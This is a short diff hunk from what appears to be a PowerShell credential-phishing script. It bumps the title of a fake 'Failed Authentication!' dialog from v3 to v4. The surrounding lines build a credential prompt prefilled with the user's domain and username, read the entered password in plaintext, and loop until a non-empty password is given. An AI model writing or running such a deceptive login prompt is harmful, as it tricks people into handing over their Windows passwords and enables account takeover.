@@ -38,7 +38,7 @@ $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgIm
  $form = $null
     while ($form -eq $null)
     {
-        $cred = $host.ui.promptforcredential('Failed Authentication!v3','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
+        $cred = $host.ui.promptforcredential('Failed Authentication!v4','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
         $cred.getnetworkcredential().password
         if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
         {
